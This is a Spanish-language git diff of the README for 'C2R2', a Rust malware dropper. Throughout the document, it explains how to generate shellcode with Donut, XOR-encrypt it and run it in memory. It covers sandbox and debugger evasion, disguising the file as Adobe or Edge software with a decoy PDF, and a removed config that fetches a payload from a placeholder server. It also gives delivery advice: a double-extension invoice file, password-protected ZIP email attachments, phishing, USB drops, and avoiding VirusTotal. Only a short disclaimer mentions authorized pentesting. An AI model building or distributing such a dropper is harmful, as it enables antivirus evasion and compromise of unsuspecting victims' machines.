@@ -1,113 +1,65 @@
-# C2R2 Rust Dropper
+# C2R2 Rust Dropper - Embedded Shellcode
 
 ## Descripción
 
-Dropper compilado en Rust diseñado para evadir Windows Defender y otros antivirus. A diferencia de los droppers basados en scripts (VBScript, JS, PowerShell, BAT), este dropper:
+Dropper compilado en Rust con shellcode embebido y encriptado con XOR. Diseñado para evadir Windows Defender y otros antivirus.
 
-- **Compila a código nativo** - No requiere intérpretes
-- **Strings ofuscados** - Todas las cadenas sensibles están ofuscadas en tiempo de compilación
-- **Anti-Sandbox** - Detecta ambientes virtualizados y sandboxes
-- **Anti-Debug** - Detecta depuradores adjuntos
-- **Metadata legítimo** - Se disfraza como actualización de Microsoft Edge
-- **Sin ventanas** - Ejecución completamente oculta
+### Características de Evasión
 
-## Características de Evasión
+- **Shellcode embebido** - No descarga nada de internet
+- **XOR encryption** - Shellcode encriptado en el binario
+- **Ejecución en memoria** - No toca el disco
+- **Anti-sandbox** - Detecta VMs y sandboxes
+- **Anti-debug** - Detecta depuradores
+- **Strings ofuscados** - `obfstr` en tiempo de compilación
+- **PDF decoy** - Abre un PDF señuelo para parecer legítimo
+- **Metadata legítimo** - Se disfraza como Adobe Acrobat
 
-### 1. Anti-Sandbox
-- Verifica uptime del sistema (< 10 min = sandbox)
-- Verifica número de CPUs (< 2 = VM)
-- Verifica RAM física (< 4GB = VM)
-- Verifica resolución de pantalla
-- Verifica movimiento del mouse
-- Verifica archivos recientes del usuario
+## Flujo de Ejecución
 
-### 2. Anti-Debug
-- Detecta IsDebuggerPresent
-- Detecta PEB BeingDebugged flag
+1. **Delay inicial** (3 segundos) - Evade aceleración de tiempo de sandbox
+2. **Anti-sandbox checks** - Verifica si está en VM/sandbox
+3. **Delay aleatorio** - Comportamiento más humano
+4. **Abre PDF decoy** - Muestra documento legítimo al usuario
+5. **Desencripta shellcode** - XOR decrypt en memoria
+6. **Ejecuta shellcode** - VirtualAlloc + VirtualProtect + call
 
-### 3. Ofuscación
-- Strings ofuscados con `obfstr` (compile-time)
-- Nombres de variables genéricos
-- Flujo de control con delays aleatorios
+## Generación del Dropper
 
-### 4. Legitimidad
-- Manifest de Windows para parecer app legítima
-- Version info de Microsoft Edge
-- Paths de instalación legítimos (%LOCALAPPDATA%\Microsoft\Edge\...)
-- User-Agent de Chrome/Edge
-
-## Compilación
-
-### Requisitos
-```bash
-# Windows target
-rustup target add x86_64-pc-windows-gnu
-
-# Cross-compilation tools (Linux)
-apt install mingw-w64
-```
-
-### Build (Producción)
-```bash
-# Desde Linux (cross-compile)
-cargo build --release --target x86_64-pc-windows-gnu --features production
-
-# Desde Windows
-cargo build --release --features production
-```
-
-### Build (Desarrollo/Test)
-```bash
-# Sin features de evasión
-cargo build --release --target x86_64-pc-windows-gnu
-```
-
-## Configuración
-
-Editar `src/config.rs` antes de compilar:
-
-```rust
-/// URL para descargar el payload (agent.exe)
-pub const PAYLOAD_URL: &str = "https://tu-servidor.com/agent.bin";
-
-/// Nombre del archivo a guardar
-pub const PAYLOAD_FILENAME: &str = "msedge_proxy.exe";
-
-/// Abrir documento señuelo
-pub const OPEN_DECOY: bool = true;
-
-/// URL del documento señuelo
-pub const DECOY_URL: &str = "https://tu-servidor.com/factura.pdf";
-```
-
-## Uso con el Builder
-
-El builder puede generar la configuración automáticamente:
+### Paso 1: Generar Shellcode con Donut
 
 ```bash
-# Futuro: integración con builder
+# Descargar donut desde: https://github.com/TheWover/donut
+
+# Generar shellcode desde agent.exe
+donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2
+
+# Parámetros:
+#   -i: Input (agent.exe)
+#   -o: Output (shellcode.bin)
+#   -f 1: Format binario
+#   -a 2: Arquitectura x64
+```
+
+### Paso 2: Encriptar Shellcode con XOR
+
+```bash
+# Usar el builder para encriptar y generar config.rs
 ./builder build-dropper \
-    --payload-url "https://servidor.com/agent.bin" \
-    --decoy-url "https://servidor.com/factura.pdf" \
-    --output "Factura_2024.exe"
+    --shellcode shellcode.bin \
+    --decoy factura.pdf \
+    --output Factura_2024.exe
 ```
 
-## Distribución
+### Paso 3: Compilar Dropper
 
-### Recomendaciones
+```bash
+# Cross-compile desde Linux
+cargo build --release --target x86_64-pc-windows-gnu --features production -p dropper
 
-1. **Hostear payload en HTTPS** - Usar dominio legítimo o CDN
-2. **Renombrar ejecutable** - `Factura_Diciembre_2024.exe`, `Documento_Confidencial.exe`
-3. **Cambiar icono** - Usar icono de PDF, Word, o similar
-4. **No subir a VirusTotal** - Quema el payload para todos los AV
-5. **Generar único por objetivo** - Evitar detección por hash
-
-### Métodos de Entrega
-
-- Email con adjunto comprimido (.zip, .rar con password)
-- USB drop
-- Watering hole (descarga desde sitio comprometido)
-- Phishing link
+# O desde Windows
+cargo build --release --features production -p dropper
+```
 
 ## Estructura del Proyecto
 
@@ -118,34 +70,65 @@ dropper-rust/
 ├── dropper.manifest        # Manifest de Windows
 ├── src/
 │   ├── main.rs            # Punto de entrada
-│   ├── config.rs          # Configuración (editar antes de compilar)
+│   ├── config.rs          # Shellcode encriptado y clave XOR
+│   ├── shellcode.rs       # Desencriptación y ejecución
 │   ├── evasion.rs         # Técnicas anti-sandbox/anti-debug
-│   └── delivery.rs        # Descarga y ejecución del payload
-└── README.md              # Este archivo
+│   └── decoy.pdf          # PDF señuelo embebido
+└── README.md
 ```
 
-## Técnicas Implementadas (MITRE ATT&CK)
+## Personalización
+
+### Cambiar Shellcode
+
+Editar `src/config.rs`:
+
+```rust
+// Clave XOR (generar aleatoria para cada build)
+pub const XOR_KEY: &[u8] = b"tu_clave_random_de_32_bytes!!!!";
+
+// Shellcode encriptado (generar con builder)
+pub const ENCRYPTED_SHELLCODE: &[u8] = &[0x12, 0x34, ...];
+```
+
+### Cambiar PDF Decoy
+
+Reemplazar `src/decoy.pdf` con tu propio PDF (factura, documento, etc.)
+
+### Cambiar Icono
+
+Colocar `pdf_icon.ico` en el directorio del dropper para que `build.rs` lo use.
+
+## Técnicas Anti-Sandbox
+
+| Check | Descripción | Umbral |
+|-------|-------------|--------|
+| Uptime | Tiempo desde boot | < 10 min |
+| CPU Cores | Número de núcleos | < 2 |
+| RAM | Memoria física | < 4 GB |
+| Screen | Resolución | < 1024x768 |
+| Mouse | Movimiento del mouse | Sin movimiento en 2s |
+| Recent Files | Archivos recientes | < 5 archivos |
+| Debugger | IsDebuggerPresent | True |
+
+## Distribución
+
+1. **Renombrar** el ejecutable: `Factura_Diciembre_2024.pdf.exe`
+2. **Cambiar icono** a icono de PDF
+3. **Comprimir** en ZIP con contraseña para email
+4. **No subir** a VirusTotal (quema el hash)
+
+## Técnicas MITRE ATT&CK
 
 | Técnica | ID | Descripción |
 |---------|-----|-------------|
-| Obfuscated Files or Information | T1027 | Strings ofuscados |
-| Virtualization/Sandbox Evasion | T1497 | Anti-sandbox checks |
-| Process Injection | T1055 | N/A (futuro) |
-| Masquerading | T1036 | Nombre/metadata legítimo |
-| Ingress Tool Transfer | T1105 | Descarga de payload |
+| Obfuscated Files | T1027 | Shellcode XOR + strings obfuscados |
+| Virtualization Evasion | T1497 | Anti-sandbox checks |
+| Process Injection | T1055 | Shellcode en memoria propia |
+| Masquerading | T1036 | PDF icon + Adobe metadata |
 | User Execution | T1204 | Requiere click del usuario |
-
-## Roadmap
-
-- [ ] Integración directa con builder
-- [ ] Modo embedded (payload incluido en el binario)
-- [ ] Shellcode injection en proceso legítimo
-- [ ] AMSI bypass
-- [ ] ETW patching
-- [ ] Process hollowing
 
 ## ⚠️ Disclaimer
 
-Este software es exclusivamente para pruebas de penetración autorizadas y operaciones de red team con autorización explícita por escrito.
-
+Este software es exclusivamente para pruebas de penetración autorizadas.
 El uso no autorizado es ilegal y punible por ley.
